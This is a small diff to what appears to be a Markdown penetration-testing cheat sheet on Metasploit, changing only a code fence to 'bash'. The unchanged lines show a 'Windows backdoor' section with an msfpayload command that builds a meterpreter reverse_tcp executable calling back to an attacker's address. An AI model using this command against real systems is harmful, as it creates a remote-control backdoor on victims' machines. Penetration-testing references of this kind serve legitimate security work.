@@ -89,7 +89,7 @@ MSF is a very powerful and  good choice for intranet penetration.When applying m
 
 ## 3.1 Windows backdoor
 
-```
+```bash
 msfpayload windows/meterpreter/reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> X > shell.exe 
 ```
 
